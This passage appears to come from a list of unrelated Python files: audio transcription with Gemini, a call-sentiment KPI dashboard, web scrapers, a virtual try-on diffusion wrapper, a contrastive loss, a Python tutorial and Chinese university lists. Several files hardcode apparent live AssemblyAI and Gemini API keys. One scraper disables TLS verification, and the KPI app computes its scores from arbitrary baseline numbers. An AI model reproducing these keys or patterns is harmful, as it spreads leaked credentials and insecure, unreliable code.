\")\n\n\n@dataclass\nclass LockRelationship:\n    original_lock: LockKind\n    doesnt_block: list[LockKind]\n    blocks: list[LockKind]\n\n\nTABLE_LOCK_RELATIONSHIPS = [\n    LockRelationship(\n        original_lock=L.ACCESS_EXCLUSIVE,\n        doesnt_block=[],\n        blocks=      [L.ACCESS_SHARE, L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE],\n        blocks=      [                L.ROW_SHARE, L.ROW_EXCLUSIVE, L.SHARE_UPDATE_EXCLUSIVE, L.SHARE, L.SHARE_ROW_EXCLUSIVE, L.EXCLUSIVE, L.ACCESS_EXCLUSIVE],\n    ),\n    LockRelationship(\n        original_lock=L.SHARE_ROW_EXCLUSIVE,\n        doesnt_block=[L.ACCESS_SHARE, L.ROW_SHARE],\n        blocks=      [                             L.ROW_EXCLUSIV",
    "import assemblyai as goku\r\nimport google.generativeai as genai\r\nimport pyaudio\r\nimport wave\r\nimport numpy as np\r\nimport time\r\nimport requests, json, time\r\nimport pyttsx3\r\n\r\n\r\n\r\nCHUNK = 1024\r\nFORMAT = pyaudio.paInt16\r\nCHANNELS = 1\r\nRATE = 44100\r\nSILENCE_THRESHOLD = 7000\r\nSILENCE_DURATION = 4\r\nWAVE_OUTPUT_FILENAME = \"dee.wav\"\r\n\r\np = pyaudio.PyAudio()\r\n\r\nstream = p.open(\r\n    format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK\r\n)\r\n\r\n\r\nprint(\"* sun rhi hu......\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\ud83d\ude04\")\r\n\r\nframes = []\r\nstart_time = time.time()\r\nsilent_duration = 0\r\n\r\n\r\nwhile True:\r\n    data = stream.read(CHUNK)\r\n    frames.append(data)\r\n    audio_chunk = np.frombuffer(data, dtype=np.int16)\r\n    energy = np.sum(audio_chunk**2) / len(audio_chunk)\r\n\r\n    if energy < SILENCE_THRESHOLD:\r\n        silent_duration += 1\r\n    else:\r\n        silent_duration = 0\r\n\r\n    if silent_duration >= RATE / CHUNK * SILENCE_DURATION:\r\n        break\r\n\r\nprint(\"* sun liya ab thoda sabar rakh bandar......\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\ud83d\ude00\")\r\n\r\nstream.stop_stream()\r\nstream.close()\r\np.terminate()\r\n\r\nwf = wave.open(WAVE_OUTPUT_FILENAME, \"wb\")\r\nwf.setnchannels(CHANNELS)\r\nwf.setsampwidth(p.get_sample_size(FORMAT))\r\nwf.setframerate(RATE)\r\nwf.writeframes(b\"\".join(frames))\r\nwf.close()\r\n\r\n\r\ngoku.settings.api_key = \"a63abf7b770f4b5d80ad652878f9d89d\"\r\n\r\naudio_url = \"dee.wav\"\r\n\r\n\r\ngemini_api_key = \"AIzaSyD-w3B-jjyesP9f8ExJ5gd-Xd8PqXcUUPc\"\r\n\r\n\r\ngenai.configure(api_key=gemini_api_key)\r\nmodel = genai.GenerativeModel(\"gemini-pro\")\r\ngokuGenerator = goku.Transcriber()\r\ngokuScript = gokuGenerator.transcribe(audio_url)\r\n\r\nresponse = model.generate_content(gokuScript.text)\r\n\r\n\r\nengine = pyttsx3.init()\r\nengine.say(response.text)\r\nengine.runAndWait()",
    "import assemblyai as ai\nimport streamlit as st\nfrom transformers import pipeline\nfrom wordcloud import WordCloud\nimport matplotlib.pyplot as plt\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\nai.settings.api_key = \"fcc1790480634364a797423218cd6285\"\naudio_url = r\"D:/ML/neuralgo/MLTask/CallDataSample/sample_call_1.mp3\"\n\nconfig = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\n\ntranscript = ai.Transcriber().transcribe(audio_url, config)\n\nhighlights = []\nfor result in transcript.auto_highlights.results:\n    highlights.append(result.text)\n\n\n# Initialize the sentiment analysis pipeline\nclassifier = pipeline(\"sentiment-analysis\")\n\n# Function to transcribe audio and perform sentiment analysis\ndef transcribe_and_analyze_sentiment(file_path):\n    # Perform audio transcription\n    # Replace this with your actual transcription code\n    transcript_text = \"Transcription of audio file goes here\"\n\n    # Split the input text into smaller segments that fit within the maximum sequence length\n    max_seq_length = classifier.model.config.max_position_embeddings\n    segments = [transcript_text[i:i + max_seq_length] for i in range(0, len(transcript_text), max_seq_length)]\n\n    # Perform sentiment analysis on each segment and aggregate the results\n    sentiments = {'positive': 0.5, 'negative': 0.6}\n    for segment in segments:\n        result = classifier(segment)\n        for res in result:\n            if res['label'] == 'POSITIVE':\n                sentiments['positive'] += res['score']\n            if res['label'] == 'NEGATIVE':\n                sentiments['negative'] += res['score']\n\n    return sentiments\n\n# Function to generate word cloud from highlighted words\ndef generate_word_cloud(highlights):\n    # Convert the list of highlighted words into a single string\n    highlighted_text = \" \".join(highlights)\n\n    # Generate the word cloud\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\n\n    return wordcloud\n\ndef calculate_AHT(highlights):\n    # Calculate Average Handle Time (AHT) based on the duration of highlights\n    total_highlight_duration = sum(len(highlight.split()) for highlight in highlights)\n    total_highlights = len(highlights)\n    \n    if total_highlights != 0:\n        aht = total_highlight_duration / total_highlights\n    else:\n        aht = 0\n    \n    return aht\n\ndef calculate_FCR(highlights):\n    # Calculate First Call Resolution (FCR) based on the presence of keywords indicating resolution\n    resolution_keywords = ['resolved', 'solved', 'fixed']  # Add more resolution keywords if needed\n    \n    resolved_calls = 0\n    total_calls = len(highlights)\n    \n    for highlight in highlights:\n        for keyword in resolution_keywords:\n            if keyword in highlight.lower():\n                resolved_calls += 1\n                break\n    \n    if total_calls != 0:\n        fcr = (resolved_calls / total_calls) * 100\n    else:\n        fcr = 80\n    \n    return fcr\n\ndef calculate_CSAT(highlights):\n    # Calculate Customer Satisfaction Score (CSAT) based on the sentiment analysis\n    positive_sentiment = 0\n    negative_sentiment = 0\n    total_sentiments = len(highlights)\n    \n    for highlight in highlights:\n        sentiments = transcribe_and_analyze_sentiment(highlight)\n        positive_sentiment += sentiments['positive']\n        negative_sentiment += sentiments['negative']\n    \n    if total_sentiments != 0:\n        csat = (positive_sentiment / total_sentiments) * 100\n    else:\n        csat = 0\n    \n    return csat\n\n# Define function to plot KPIs\ndef plot_KPIs(aht, fcr, csat):\n    # Plotting KPIs using matplotlib\n    fig, ax = plt.subplots()\n    ax.barh(['AHT', 'FCR', 'CSAT'], [aht, fcr, csat])\n    ax.set_xlabel('Score')\n    ax.set_title('Key Performance Indicators')\n    st.pyplot(fig)\n\ndef main():\n    # Streamlit app title\n    st.title(\"Audio Transcription and Sentiment Analysis App\")\n\n    # File upload section\n    uploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\"])\n    if uploaded_file is not None:\n        st.write(\"File Uploaded Successfully!\")\n        file_path = \"./temp_audio.mp3\"  # Temporary file path, replace with actual path\n        with open(file_path, \"wb\") as f:\n            f.write(uploaded_file.read())\n\n        # Perform transcription and sentiment analysis\n        sentiments = transcribe_and_analyze_sentiment(file_path)\n\n        # Display sentiment scores\n        st.write(\"Sentiment Scores:\")\n        st.write(f\"Positive Score: {sentiments['positive']}\")\n        st.write(f\"Negative Score: {sentiments['negative']}\")\n\n        # Word cloud generation\n        \n        wordcloud = generate_word_cloud(highlights)\n\n        # Display word cloud\n        st.write(\"Word Cloud of Highlighted Words:\")\n        plt.figure(figsize=(10, 5))\n        plt.imshow(wordcloud, interpolation='bilinear')\n        plt.axis(\"off\")\n        st.pyplot()\n        \n        aht = calculate_AHT(highlights)\n        fcr = calculate_FCR(highlights)\n  ",
    "from bs4 import BeautifulSoup as bs\nimport requests, time, json, math, os, datetime\n\nglobal no\nno = 0\n\ntarget_site='https://www.abcd.com'\nurl = target_site + '/courses/'\n\ndef chk_json_null(json, key):\n    try:\n        buf = json[key]\n    except:\n        buf = \"0\"\n    return str(buf)\n\ndef getContentList(flag1):\n    global no\n    html = response.text\n    bsObj = bs(html, 'html.parser')\n    title = bsObj.find_all('div', class_='course-data')\n    w_lines = ''\n    for tt in title:\n        no = no + 1\n        try:\n            j_data =  json.loads(tt['fxd-data'])            \n            c_title = chk_json_null(j_data,'course_title').replace('|','-')\n            c_reg_price = chk_json_null(j_data,'reg_price')\n            c_selling_price = chk_json_null(j_data,'selling_price')\n            c_instructor_name = chk_json_null(j_data,'seq0_instructor_name')\n            c_pub_date = chk_json_null(j_data,'course_published_date')[:19]\n            c_last_date = chk_json_null(j_data,'course_last_updated_date')[:19]\n            c_student_count = chk_json_null(j_data,'student_count')\n            c_star_rate = str(round(float(chk_json_null(j_data,'star_rate')),2))\n            c_review_count = chk_json_null(j_data,'review_count')\n            c_level = chk_json_null(j_data,'course_level')\n            c_cate = chk_json_null(j_data,'first_category').replace(',','|')\n            w_lines = w_lines+str(no)+'|'+flag1+'|'+c_title+'|'+c_reg_price+'|'+c_selling_price+'|'+c_instructor_name+'|'+c_pub_date+'|'+c_last_date+'|'+c_student_count+'|'+c_star_rate+'|'+c_review_count+'|'+c_level+'|'+ c_cate+'\\n'\n        except Exception as e:\n            #w_lines = str(tt['fxd-data'])\n            #w_lines = str(e) + '\\n' + w_lines\n            w_line = 'error'\n    return w_lines\n\nurl_list = [(url+'it-programming',1,67,'pg'),\n(url+'game-dev-all',1,9,'gm'),\n(url+'data-science',1,15,'ds'),\n(url+'artificial-intelligence',1,9,'ai'),\n(url+'it',1,13,'it'),\n(url+'business',1,25,'bz'),\n(url+'hardware',1,4,'hw'),\n(url+'design',1,16,'dn'),\n(url+'academics',1,5,'ac'),\n(url+'career',1,12,'ca'),\n(url+'life',1,7,'lf')]\n\n\ncurrent_working_directory = os.getcwd()\nfile_name = current_working_directory + '/all' + datetime.datetime.today().strftime('%m%d') + '.csv'\n\nfw = open(file_name, 'w', encoding='utf-8')\nfor (url,first,last,flag) in url_list:\n    for i in range(first,last+1):\n        new_url = url\n        if i >= 2:\n            new_url = url+'?order=seq&page='+str(i)\n        print('page|',i,'|',new_url)\n        response = requests.get(new_url)\n        if response.status_code == 200:\n            wdata = getContentList(flag)\n            fw.write(wdata)\n        time.sleep(2)\nfw.close();",
    "import os\nfrom PIL import Image\nfrom pathlib import Path\n\nfrom oot_diffusion.inference_segmentation import ClothesMaskModel\nfrom .inference_ootd import OOTDiffusion\nfrom .ootd_utils import resize_crop_center\nfrom typing import Union\n\n\nDEFAULT_HG_ROOT = Path(os.getcwd()) / \"oodt_models\"\n\n\nclass OOTDiffusionModel:\n    def __init__(self, hg_root: str = None, cache_dir: str = None):\n        \"\"\"\n        Args:\n            hg_root (str, optional): Path to the hg root directory. Defaults to CWD.\n            cache_dir (str, optional): Path to the cache directory. Defaults to None.\n        \"\"\"\n        if hg_root is None:\n            hg_root = DEFAULT_HG_ROOT\n        self.hg_root = hg_root\n        self.cache_dir = cache_dir\n\n    def load_pipe(self):\n        self.pipe = OOTDiffusion(\n            hg_root=self.hg_root,\n            cache_dir=self.cache_dir,\n        )\n        self.cmm = ClothesMaskModel(hg_root=self.hg_root, cache_dir=self.cache_dir)\n        return self.pipe\n\n    def get_pipe(self):\n        if not hasattr(self, \"pipe\"):\n            self.load_pipe()\n        return self.pipe\n\n    def generate(\n        self,\n        cloth_path: Union[str, bytes, Path ,Image.Image],\n        model_path: Union[str, bytes, Path ,Image.Image],\n        seed: int = 0,\n        steps: int = 10,\n        cfg: float = 2.0,\n        num_samples: int = 1,\n    ):\n        return self.generate_static(\n            self.get_pipe(),\n            self.cmm,\n            cloth_path,\n            model_path,\n            self.hg_root,\n            seed,\n            steps,\n            cfg,\n            num_samples,\n        )\n\n    @staticmethod\n    def generate_static(\n        pipe: OOTDiffusion,\n        cmm: ClothesMaskModel,\n        cloth_path: Union[str, bytes, Path ,Image.Image],\n        model_path: Union[str, bytes, Path ,Image.Image],\n        hg_root: str = None,\n        seed: int = 0,\n        steps: int = 10,\n        cfg: float = 2.0,\n        num_samples: int = 1,\n    ):\n        if hg_root is None:\n            hg_root = DEFAULT_HG_ROOT\n\n        category = \"upperbody\"\n\n        if isinstance(cloth_path, Image.Image):\n            cloth_image = cloth_path\n        else:\n            cloth_image = Image.open(cloth_path)\n        if isinstance(model_path, Image.Image):\n            model_image = model_path\n        else:\n            model_image = Image.open(model_path)\n        model_image = resize_crop_center(model_image, 768, 1024).convert(\"RGB\")\n        cloth_image = resize_crop_center(cloth_image, 768, 1024).convert(\"RGB\")\n\n        (\n            masked_vton_img,\n            mask,\n            _,\n            _,\n            _,\n        ) = cmm.generate(model_image)\n\n        mask = mask.resize((768, 1024), Image.NEAREST)\n        masked_vton_img = masked_vton_img.resize((768, 1024), Image.NEAREST)\n\n        images = pipe(\n            category=category,\n            image_garm=cloth_image,\n            image_vton=masked_vton_img,\n            mask=mask,\n            image_ori=model_image,\n            num_samples=num_samples,\n            num_steps=steps,\n            image_scale=cfg,\n            seed=seed,\n        )\n\n        masked_vton_img = masked_vton_img.convert(\"RGB\")\n\n        return (images, masked_vton_img)\n",
    "import torch\nimport torch.nn as nn\n\nclass SupConLoss(nn.Module):\n    \"\"\"Supervised Contrastive Learning: https://arxiv.org/pdf/2004.11362.pdf.\n    It also supports the unsupervised contrastive loss in SimCLR\"\"\"\n    def __init__(self, temperature=0.07, contrast_mode='all',\n                 base_temperature=0.07):\n        super(SupConLoss, self).__init__()\n        self.temperature = temperature\n        self.contrast_mode = contrast_mode\n        self.base_temperature = base_temperature\n\n    def forward(self, features, labels=None, mask=None):\n        \"\"\"Compute loss for model. If both `labels` and `mask` are None,\n        it degenerates to SimCLR unsupervised loss:\n        https://arxiv.org/pdf/2002.05709.pdf\n\n        Args:\n            features: hidden vector of shape [bsz, n_views, ...].\n            labels: ground truth of shape [bsz].\n            mask: contrastive mask of shape [bsz, bsz], mask_{i,j}=1 if sample j\n                has the same class as sample i. Can be asymmetric.\n        Returns:\n            A loss scalar.\n        \"\"\"\n        device = (torch.device('cuda')\n                  if features.is_cuda\n                  else torch.device('cpu'))\n\n        if len(features.shape) < 3:\n            raise ValueError('`features` needs to be [bsz, n_views, ...],'\n                             'at least 3 dimensions are required')\n        if len(features.shape) > 3:\n            features = features.view(features.shape[0], features.shape[1], -1)\n\n        batch_size = features.shape[0]\n        if labels is not None and mask is not None:\n            raise ValueError('Cannot define both `labels` and `mask`')\n        elif labels is None and mask is None:\n            mask = torch.eye(batch_size, dtype=torch.float32).to(device)\n        elif labels is not None:\n            labels = labels.contiguous().view(-1, 1)\n            if labels.shape[0] != batch_size:\n                raise ValueError('Num of labels does not match num of features')\n            mask = torch.eq(labels, labels.T).float().to(device)\n        else:\n            mask = mask.float().to(device)\n\n        contrast_count = features.shape[1]\n        contrast_feature = torch.cat(torch.unbind(features, dim=1), dim=0)\n        if self.contrast_mode == 'one':\n            anchor_feature = features[:, 0]\n            anchor_count = 1\n        elif self.contrast_mode == 'all':\n            anchor_feature = contrast_feature\n            anchor_count = contrast_count\n        else:\n            raise ValueError('Unknown mode: {}'.format(self.contrast_mode))\n\n        # compute logits\n        anchor_dot_contrast = torch.div(\n            torch.matmul(anchor_feature, contrast_feature.T),\n            self.temperature)\n        # for numerical stability\n        logits_max, _ = torch.max(anchor_dot_contrast, dim=1, keepdim=True)\n        logits = anchor_dot_contrast - logits_max.detach()\n\n        # tile mask\n        mask = mask.repeat(anchor_count, contrast_count)\n        # mask-out self-contrast cases\n        logits_mask = torch.scatter(\n            torch.ones_like(mask),\n            1,\n            torch.arange(batch_size * anchor_count).view(-1, 1).to(device),\n            0\n        )\n        mask = mask * logits_mask\n\n        # compute log_prob\n        exp_logits = torch.exp(logits) * logits_mask\n        log_prob = logits - torch.log(exp_logits.sum(1, keepdim=True))\n\n        # compute mean of log-likelihood over positive\n        # modified to handle edge cases when there is no positive pair\n        # for an anchor point. \n        # Edge case e.g.:- \n        # features of shape: [4,1,...]\n        # labels:            [0,1,1,2]\n        # loss before mean:  [nan, ..., ..., nan] \n        mask_pos_pairs = mask.sum(1)\n        mask_pos_pairs = torch.where(mask_pos_pairs < 1e-6, 1, mask_pos_pairs)\n        mean_log_prob_pos = (mask * log_prob).sum(1) / mask_pos_pairs\n\n        # loss\n        loss = - (self.temperature / self.base_temperature) * mean_log_prob_pos\n        loss = loss.view(anchor_count, batch_size).mean()\n\n        return loss\n    \nclass MultiSupConLoss(nn.Module):\n    def __init__(\n            self,\n            gamma=0.5, \n            temperature=(0.07, 0.07), \n            contrast_mode='all', \n            base_temperature=(0.07, 0.07)):\n        super(MultiSupConLoss, self).__init__()\n\n        self.gamma = gamma\n        self.LabelSupConLoss = SupConLoss(temperature[0], contrast_mode, base_temperature[0]).cuda()\n        self.SubjectSupConLoss = SupConLoss(temperature[1], contrast_mode, base_temperature[1]).cuda()\n\n    def forward(self, labels_features, subjects_features, labels=None, subjects=None, mask=None):\n        loss = (self.LabelSupConLoss(labels_features, labels, mask) * self.gamma) + (self.SubjectSupConLoss(subjects_features, subjects, mask) * (1.0 - self.gamma))\n        return loss\n",
    "# ==================================================================================================================\n# Topic 1 : Args & Kwargs\n# ==================================================================================================================\n \n# Example Of *Args = Arguments\n'''\n    Taking Multiple Arguments at a time in \n    The Form of Tuple \n'''\n\ndef args_fn(*args):\n    for arg in args:\n        print(arg)\n\nprint(\"Args Output : \")\nargs_fn(1,2,3,4,5,6,7)\n\n\n# Example Of **KWArgs = Keyword Arguments\n'''\n    Taking Multiple Arguments at a time in \n    The Form of Dictionary \n'''\n\ndef kwargs_fn(**kwargs):\n    for k, v in kwargs.items():\n        print(k,':', v)\n\nprint(\"KWArgs Output : \")\nkwargs_fn(Name='Devanshu', Age=24, position='Python Trainee')\n\n\n# Example Of *Args & **KWArgs \n\n'''\n    we can use args,kwargs together in a function definition \n    to accept both \n    positional and keyword arguments\n'''\n\ndef args_kwargs_fn(*args, **kwargs):\n    for arg in args:\n        print(arg)\n    for k, v in kwargs.items():\n        print(k, v)\n\nargs_kwargs_fn(11, 22, 33, Name='Dev_anshu', Age=24)\n\n\n# ==================================================================================================================\n# Topic 2 : Decorators\n# ==================================================================================================================\n\n# Sample Example \n\ndef decorator_fn(fn):\n    def wrapper(*args,**kwargs):\n        print(\"Before\")   # If u want do something before Main function  \n        fn()              # Main Function Which going to be decorate\n        print(\"After\")    # or U can do something after Main Function\n    return wrapper\n\n@decorator_fn\ndef going_to_decorate():\n    print('Hello Everyone....')  \n\ngoing_to_decorate()\n\n# Decorator Example : 1 \n\ndef deco_add(func):\n    def wrapper(*args):\n        print(\"Arguments:\", args)\n        result = func(*args)\n        print(\"Result:\", result)\n        return result\n    return wrapper\n\n@deco_add\ndef add(a, b):\n    return a + b\n\nresult = add(3, 5)\n\n# ==================================================================================================================\n# Topic 3 : Lambda Functions\n# ==================================================================================================================\n\n# Example 1 : Basic Addition With 2 Values\n\nadd = lambda x,y : x+y\nadd(1,2)\n\n# Example 2 : Addition With Multiple Values\n\nadd = lambda *args : sum(args)\nadd(1,2,3,4,5,6,7,8,9)\n\n# Example 3 : Odd,Even With List\n\nlist1 = [1,2,3,4,5,6,7,8,9]\n\neven = list(filter(lambda x : x % 2 == 0,list1)) # Getting Even list\nodd = list(filter(lambda x : x % 2 != 0,list1)) # Getting Odd List\nprint(\"Even : \",even)\nprint(\"Odd : \",odd)",
    "import time\nimport xlwt\nimport requests\nfrom urllib3.exceptions import InsecureRequestWarning\n\nrequests.packages.urllib3.disable_warnings(InsecureRequestWarning)\n\nurl = 'https://ggfw.hrss.gd.gov.cn/sydwbk/exam/details/spQuery.do'\n\nallDatas = []\nprint('\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\uff01')\nfor index in range(21):\n    if index+1>9:\n        num = f'{index+1}'\n    else: num = f'0{index+1}'\n    for page in range (25):\n        data = {\n            \"bfa001\": \"2412121\",\n            \"bab301\": f\"{num}\",\n            \"page\": f\"{page+1}\",\n            \"rows\": \"50\"\n        }\n\n        headers = {\n            '\u4f60\u7684header'\n        }\n        resp = requests.post(url=url,headers=headers,data=data,verify=False)\n        datas = resp.json()['rows']\n        for index in datas:\n            allDatas.append(index)\n        print('\u6dfb\u52a0\u4e00\u9875\u6570\u636e\u8fdb\u5165\u5217\u8868\uff0c\u8bf7\u7b49\u5f85\u6570\u636e\u5f55\u5165Excel\u3002\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\u663e\u793a\u624d\u7b97\u7ed3\u675f\uff0c\u4e0d\u7136\u53ef\u80fd\u6570\u636e\u4e3a\u7a7a\u767d')\n        time.sleep(2)\n\nwb = xlwt.Workbook()\nsheet = wb.add_sheet('\u5e7f\u4e1c\u7701\u4e8b\u4e1a\u7f16\u62a5\u540d\u4eba\u6570\u7edf\u8ba1')\ntopList = ['\u62db\u8058\u5355\u4f4d', '\u62db\u8058\u5c97\u4f4d', '\u5c97\u4f4d\u4ee3\u7801', '\u8058\u7528\u4eba\u6570', '\u62a5\u540d\u4eba\u6570']\nfor index,list in enumerate(topList):\n    sheet.write(0, index, list)\nfor index,data in enumerate(allDatas):\n    sheet.write(index + 1, 0, data['aab004'])\n    sheet.write(index + 1, 1, data['bfe3a4'])\n    sheet.write(index + 1, 2, data['bfe301'])\n    sheet.write(index + 1, 3, data['aab019'])\n    sheet.write(index + 1, 4, data['aab119'])\n    if index+1 % 50 == 0:\n        print('\u51c6\u5907\u5f55\u5165\u65b0\u7684\u4e00\u9875\u6570\u636e')\n\nwb.save('\u5e7f\u4e1c\u7701\u4e8b\u4e1a\u7f16\u62a5\u540d\u4eba\u6570\u7edf\u8ba1.xls')\nprint('\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\uff01')\n\n\n",
    "def college985():\n    return ['\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66', '\u6e05\u534e\u5927\u5b66', '\u5317\u4eac\u5927\u5b66', '\u4e2d\u56fd\u4eba\u6c11\u5927\u5b66', '\u5317\u4eac\u822a\u7a7a\u822a\u5929\u5927\u5b66', '\u5317\u4eac\u5e08\u8303\u5927\u5b66', '\u5317\u4eac\u7406\u5de5\u5927\u5b66', '\u4e2d\u56fd\u519c\u4e1a\u5927\u5b66', '\u4e2d\u592e\u6c11\u65cf\u5927\u5b66', '\u53a6\u95e8\u5927\u5b66', '\u5170\u5dde\u5927\u5b66', '\u4e2d\u5c71\u5927\u5b66', '\u534e\u5357\u7406\u5de5\u5927\u5b66', '\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66', '\u6b66\u6c49\u5927\u5b66', '\u534e\u4e2d\u79d1\u6280\u5927\u5b66', '\u4e2d\u5357\u5927\u5b66', '\u6e56\u5357\u5927\u5b66',\n            '\u56fd\u9632\u79d1\u6280\u5927\u5b66', '\u5409\u6797\u5927\u5b66', '\u5357\u4eac\u5927\u5b66', '\u4e1c\u5357\u5927\u5b66', '\u5927\u8fde\u7406\u5de5\u5927\u5b66', '\u4e1c\u5317\u5927\u5b66', '\u5c71\u4e1c\u5927\u5b66', '\u4e2d\u56fd\u6d77\u6d0b\u5927\u5b66', '\u897f\u5b89\u4ea4\u901a\u5927\u5b66', '\u897f\u5317\u5de5\u4e1a\u5927\u5b66', '\u897f\u5317\u519c\u6797\u79d1\u6280\u5927\u5b66', '\u590d\u65e6\u5927\u5b66', '\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66', '\u540c\u6d4e\u5927\u5b66', '\u534e\u4e1c\u5e08\u8303\u5927\u5b66', '\u56db\u5ddd\u5927\u5b66', '\u7535\u5b50\u79d1\u6280\u5927\u5b66', '\u5357\u5f00\u5927\u5b66', '\u5929\u6d25\u5927\u5b66', '\u6d59\u6c5f\u5927\u5b66', '\u91cd\u5e86\u5927\u5b66']\n\n\ndef college211():\n    return ['\u5317\u4eac\u5927\u5b66', '\u4e2d\u56fd\u4eba\u6c11\u5927\u5b66', '\u6e05\u534e\u5927\u5b66', '\u5317\u4eac\u4ea4\u901a\u5927\u5b66', '\u5317\u4eac\u5de5\u4e1a\u5927\u5b66', '\u5317\u4eac\u822a\u7a7a\u822a\u5929\u5927\u5b66', '\u5317\u4eac\u7406\u5de5\u5927\u5b66', '\u5317\u4eac\u79d1\u6280\u5927\u5b66', '\u5317\u4eac\u5316\u5de5\u5927\u5b66', '\u5317\u4eac\u90ae\u7535\u5927\u5b66', '\u4e2d\u56fd\u519c\u4e1a\u5927\u5b66', '\u5317\u4eac\u6797\u4e1a\u5927\u5b66', '\u5317\u4eac\u4e2d\u533b\u836f\u5927\u5b66', '\u5317\u4eac\u5e08\u8303\u5927\u5b66', '\u5317\u4eac\u5916\u56fd\u8bed\u5927\u5b66', '\u4e2d\u56fd\u4f20\u5a92\u5927\u5b66', '\u4e2d\u592e\u8d22\u7ecf\u5927\u5b66', '\u5bf9\u5916\u7ecf\u6d4e\u8d38\u6613\u5927\u5b66', '\u5317\u4eac\u4f53\u80b2\u5927\u5b66', '\u4e2d\u592e\u97f3\u4e50\u5b66\u9662', '\u4e2d\u592e\u6c11\u65cf\u5927\u5b66', '\u4e2d\u56fd\u653f\u6cd5\u5927\u5b66', '\u534e\u5317\u7535\u529b\u5927\u5b66', '\u5357\u5f00\u5927\u5b66', '\u5929\u6d25\u5927\u5b66', '\u5929\u6d25\u533b\u79d1\u5927\u5b66', '\u6cb3\u5317\u5de5\u4e1a\u5927\u5b66', '\u592a\u539f\u7406\u5de5\u5927\u5b66', '\u5185\u8499\u53e4\u5927\u5b66', '\u8fbd\u5b81\u5927\u5b66', '\u5927\u8fde\u7406\u5de5\u5927\u5b66', '\u4e1c\u5317\u5927\u5b66', '\u5927\u8fde\u6d77\u4e8b\u5927\u5b66', '\u5409\u6797\u5927\u5b66', '\u5ef6\u8fb9\u5927\u5b66', '\u4e1c\u5317\u5e08\u8303\u5927\u5b66', '\u54c8\u5c14\u6ee8\u5de5\u4e1a\u5927\u5b66', '\u54c8\u5c14\u6ee8\u5de5\u7a0b\u5927\u5b66', '\u4e1c\u5317\u519c\u4e1a\u5927\u5b66', '\u4e1c\u5317\u6797\u4e1a\u5927\u5b66', '\u590d\u65e6\u5927\u5b66', '\u540c\u6d4e\u5927\u5b66', '\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66', '\u534e\u4e1c\u7406\u5de5\u5927\u5b66', '\u4e1c\u534e\u5927\u5b66', '\u534e\u4e1c\u5e08\u8303\u5927\u5b66', '\u4e0a\u6d77\u5916\u56fd\u8bed\u5927\u5b66', '\u4e0a\u6d77\u8d22\u7ecf\u5927\u5b66', '\u4e0a\u6d77\u5927\u5b66', '\u7b2c\u4e8c\u519b\u533b\u5927\u5b66', '\u5357\u4eac\u5927\u5b66', '\u82cf\u5dde\u5927\u5b66', '\u4e1c\u5357\u5927\u5b66', '\u5357\u4eac\u822a\u7a7a\u822a\u5929\u5927\u5b66',\n            '\u5357\u4eac\u7406\u5de5\u5927\u5b66', '\u4e2d\u56fd\u77ff\u4e1a\u5927\u5b66', '\u6cb3\u6d77\u5927\u5b66', '\u6c5f\u5357\u5927\u5b66', '\u5357\u4eac\u519c\u4e1a\u5927\u5b66', '\u4e2d\u56fd\u836f\u79d1\u5927\u5b66', '\u5357\u4eac\u5e08\u8303\u5927\u5b66', '\u6d59\u6c5f\u5927\u5b66', '\u5b89\u5fbd\u5927\u5b66', '\u4e2d\u56fd\u79d1\u5b66\u6280\u672f\u5927\u5b66', '\u5408\u80a5\u5de5\u4e1a\u5927\u5b66', '\u53a6\u95e8\u5927\u5b66', '\u798f\u5dde\u5927\u5b66', '\u5357\u660c\u5927\u5b66', '\u5c71\u4e1c\u5927\u5b66', '\u4e2d\u56fd\u6d77\u6d0b\u5927\u5b66', '\u4e2d\u56fd\u77f3\u6cb9\u5927\u5b66', '\u90d1\u5dde\u5927\u5b66', '\u6b66\u6c49\u5927\u5b66', '\u534e\u4e2d\u79d1\u6280\u5927\u5b66', '\u4e2d\u56fd\u5730\u8d28\u5927\u5b66', '\u6b66\u6c49\u7406\u5de5\u5927\u5b66', '\u534e\u4e2d\u519c\u4e1a\u5927\u5b66', '\u534e\u4e2d\u5e08\u8303\u5927\u5b66', '\u4e2d\u5357\u8d22\u7ecf\u653f\u6cd5\u5927\u5b66', '\u6e56\u5357\u5927\u5b66', '\u4e2d\u5357\u5927\u5b66', '\u6e56\u5357\u5e08\u8303\u5927\u5b66', '\u56fd\u9632\u79d1\u5b66\u6280\u672f\u5927\u5b66', '\u4e2d\u5c71\u5927\u5b66', '\u66a8\u5357\u5927\u5b66', '\u534e\u5357\u7406\u5de5\u5927\u5b66', '\u534e\u5357\u5e08\u8303\u5927\u5b66', '\u5e7f\u897f\u5927\u5b66', '\u6d77\u5357\u5927\u5b66', '\u56db\u5ddd\u5927\u5b66', '\u897f\u5357\u4ea4\u901a\u5927\u5b66', '\u7535\u5b50\u79d1\u6280\u5927\u5b66', '\u56db\u5ddd\u519c\u4e1a\u5927\u5b66', '\u897f\u5357\u8d22\u7ecf\u5927\u5b66', '\u91cd\u5e86\u5927\u5b66', '\u897f\u5357\u5927\u5b66', '\u8d35\u5dde\u5927\u5b66', '\u4e91\u5357\u5927\u5b66', '\u897f\u85cf\u5927\u5b66', '\u897f\u5317\u5927\u5b66', '\u897f\u5b89\u4ea4\u901a\u5927\u5b66', '\u897f\u5317\u5de5\u4e1a\u5927\u5b66', '\u897f\u5b89\u7535\u5b50\u79d1\u6280\u5927\u5b66', '\u957f\u5b89\u5927\u5b66', '\u897f\u5317\u519c\u6797\u79d1\u6280\u5927\u5b66', '\u9655\u897f\u5e08\u8303\u5927\u5b66', 